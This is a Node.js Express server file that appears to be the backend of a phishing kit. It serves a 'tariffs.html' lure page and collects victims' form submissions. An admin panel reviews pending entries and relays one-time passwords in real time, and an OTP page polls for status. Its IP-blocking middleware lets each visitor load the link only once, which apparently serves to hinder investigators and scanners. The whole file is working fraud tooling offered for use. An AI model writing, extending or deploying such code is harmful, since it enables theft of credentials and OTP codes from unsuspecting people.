// 1. Import the necessary packages
const express = require("express");
const cors = require("cors");
const path = require("path");

// 2. Create the server application
const app = express();
const PORT = process.env.PORT || 3000;

// --- NEW CODE: IP TRACKING ---
// Create a Set to store IPs that have visited. A Set is used for fast lookups.
// IMPORTANT: This list will be cleared every time your server restarts on Render.
// For a permanent solution, you would need to use a database.
const visitedIPs = new Set();

// This is our IP blocking middleware. It will run on every request.
const ipBlocker = (req, res, next) => {
    // Render and other hosts set req.ip correctly even behind a proxy
    const userIp = req.ip; 

    // Check if the user's IP is already in our list
    if (visitedIPs.has(userIp)) {
        // If it is, send a "Forbidden" status and a message.
        return res.status(403).send(`
            <div style="font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h1>Access Denied</h1>
                <p>This link was for one-time use and has already been accessed from this network.</p>
            </div>
        `);
    }

    // If it's a new IP, add it to the list for future checks
    visitedIPs.add(userIp);

    // Continue to the next step (serving the website)
    next();
};

// Apply the IP blocker middleware to ALL incoming requests
app.use(ipBlocker);
// --- END OF NEW CODE ---


// 3. Apply other middleware
app.use(cors());
app.use(express.json());

// 4. Tell the server to serve all your HTML, CSS, and image files
app.use(express.static(path.join(__dirname)));

// This tells the server that when someone visits the main address ('/'),
// it should send them the 'tariffs.html' file.
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "tariffs.html"));
});

// 5. Create an "in-memory" database that holds a LIST of submissions
let submissions = [];

// ... (The rest of your endpoints: /submit, /submission, /update-status, etc.)
// No changes are needed to your existing endpoints.

// 6. Endpoint for receiving user data
app.post("/submit", (req, res) => {
    console.log("Received a new submission!");
    const newSubmission = req.body;
    newSubmission.id = Date.now().toString(); 
    newSubmission.status = "pending";
    newSubmission.timestamp = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
    submissions.push(newSubmission);
    res.status(200).json({
        message: "Submission received.",
        submissionId: newSubmission.id,
    });
});

// 7. Endpoint for the admin panel to get ALL PENDING submissions
app.get("/submission", (req, res) => {
    const pendingSubmissions = submissions.filter(
        (s) => s.status === "pending",
    );
    res.status(200).json(pendingSubmissions);
});

// 8. Endpoint for updating the status (from admin) OR adding/clearing the OTP
app.post("/update-status", (req, res) => {
    const { id, status, otp } = req.body;
    const submission = submissions.find((s) => s.id === id);

    if (submission) {
        if (status) {
            submission.status = status;
            console.log(`Submission ${id} status updated to: ${status}`);
        }
        if (otp) {
            submission.otp = otp;
            console.log(`Submission ${id} received OTP: ${otp}`);
        } else if (otp === null) {
            submission.otp = null;
            console.log(`Submission ${id} OTP cleared.`);
        }
        res.status(200).json({ message: `Submission ${id} updated.` });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 9. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
app.get("/get-status/:id", (req, res) => {
    const { id } = req.params;
    const submission = submissions.find((s) => s.id === id);
    if (submission) {
        res.status(200).json({ status: submission.status });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 10. Endpoint for the admin to get the ARCHIVE
app.get("/archive", (req, res) => {
    const archivedSubmissions = submissions
        .filter((s) => s.status !== "pending")
        .reverse();
    res.status(200).json(archivedSubmissions);
});


// 11. Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
